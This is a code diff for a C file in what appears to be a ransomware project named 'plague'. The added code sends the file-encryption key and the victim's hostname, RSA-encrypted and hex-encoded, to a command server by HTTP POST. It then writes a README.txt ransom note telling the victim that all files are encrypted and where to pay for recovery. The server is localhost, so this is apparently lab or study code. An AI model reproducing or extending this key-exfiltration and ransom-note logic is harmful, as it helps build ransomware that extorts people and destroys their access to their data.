@@ -1,28 +1,61 @@
-#include <stdio.h> /* printf, sprintf */
-#include <stdlib.h> /* exit */
-#include <unistd.h> /* read, write, close */
-#include <string.h> /* memcpy, memset */
-#include <sys/socket.h> /* socket, connect */
-#include <netinet/in.h> /* struct sockaddr_in, struct sockaddr */
-#include <netdb.h> /* struct hostent, gethostbyname */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
 
-void error(const char *msg) { perror(msg); exit(0); }
+#include "includes/plague.h"
 
-int send_key(char *key)
+void error(const char *msg)
 {
-    /* first what are we going to send and where are we going to send it? */
-    int port = 80;
-    char *host = "localhost";
-    char *request = "POST /plague_server/ HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\nkey=%s";
+    perror(msg);
+    exit(0);
+}
 
+char *get_hostname()
+{
+    char hostname[1024];
+
+    hostname[1023] = '\0';
+    gethostname(hostname, 1023);
+    return strdup(hostname);
+}
+
+void write_readme(char *id)
+{
+    FILE *fp;
+    fp = fopen("README.txt","w+");
+    fprintf(fp, "All your files are encrypted. Go to http://localhost/plague_server/?id=%s to know how to get your data recovered\n", id);
+    fclose(fp);
+}
+
+int send_key(char *key, char *hostname)
+{
     struct hostent *server;
     struct sockaddr_in serv_addr;
     int sockfd, bytes, sent, received, total;
-    char message[1024], response[4096];
+    char json[1024], message[4096], response[20000]; // revoir les tailles
+    size_t len = 0;
+    int port = 80;
+    unsigned char *data;
+    char *host = "localhost";
+    char *request = "POST /plague_server/ HTTP/1.1\r\n"
+                    "Host: localhost\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: %d\r\n\r\n"
+                    "data=%s";
+    char *format = "{\"key\":\"%s\", \"hostname\":\"%s\"}";
+    char *encoded;
 
     /* fill in the parameters */
-    sprintf(message, request, strlen("key=") + strlen(key), key);
-    printf("Request:\n%s\n", message);
+    sprintf(json, format, key, hostname); // 21
+
+    // encode data
+    data = rsa_encode((unsigned char *)json, &len); //encode
+    encoded = bin2hex(data, len);
+    sprintf(message, request, strlen("data=") + strlen((char *)encoded), encoded);
 
     /* create the socket */
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -75,6 +108,10 @@ int send_key(char *key)
     close(sockfd);
 
     /* process response */
-    printf("Response:\n%s\n",response);
+    char *id = strstr(response, "id:");
+    if (!id)
+        return 0;
+    id = strtok(id, " \n");
+    write_readme(&id[3]);
     return 0;
 }
